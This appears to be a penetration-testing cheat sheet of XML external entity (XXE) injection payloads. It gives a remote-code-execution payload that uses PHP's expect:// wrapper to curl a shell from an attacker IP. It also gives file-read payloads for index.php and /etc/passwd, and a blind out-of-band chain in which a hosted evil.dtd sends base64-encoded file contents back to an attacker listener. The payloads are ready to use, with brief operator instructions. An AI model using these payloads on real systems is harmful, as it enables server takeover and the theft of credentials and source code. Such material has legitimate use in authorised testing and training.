# Xxe_injection

## xxe injection RCE

### XXE RCE

XXE that abuses the `expect://` PHP wrapper to fetch and execute a remote shell. Requires the expect extension to be loaded on the server.

```sh title:"XXE via expect:// wrapper to fetch remote shell"
# Inject this into your request and call &company in the right field to execute the payload, remember to set your listener so the target can download your payload.
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'$IP/shell.php'">
]>
```
<!-- cheat
import tun_ip
-->

## xxe injection File reading

### XXE base64 file read

Use the PHP base64 filter to read a file safely (avoids XML parse errors when source contains `<` or `&`). Decode the result client-side.

```sh title:"Read file via php://filter base64, decode client-side"
# Inject this into your request inside the XML field to read 'index.php' and call &company in the right field to execute the payload, decode the result using 'echo $data | base64 -d > file && cat file'
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
<!-- cheat
import tun_ip
import webserver
var data
-->

### XXE plaintext file read

Plain `file://` read. Works for files without XML-breaking characters; falls over on PHP source with `<?` tags.

```sh title:"Plain file:// read for XML-safe files"
# Inject this into your request inside the XML field to read '/etc/passwd' and call &company in the right field to execute the payload.
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

### XXE blind OOB

Out-of-band XXE chain: parser fetches `evil.dtd` from your server, embeds the target file contents into a URL, and requests it back. Use when the response body doesn't echo entities.

```sh title:"OOB XXE chain: external dtd exfils via callback URL"
Step 1: Set up a file like this called evil.dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://$lhost:$lport/?content=%file;'>">
Step 2: Start listener:
php -S 0.0.0.0:8000
Step 3: Inject this into your payload
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://$lhost:$lport/xxe.dtd">
  %remote;
  %oob;
]>
```
<!-- cheat
import tun_ip
import webserver
var port
var lport
-->

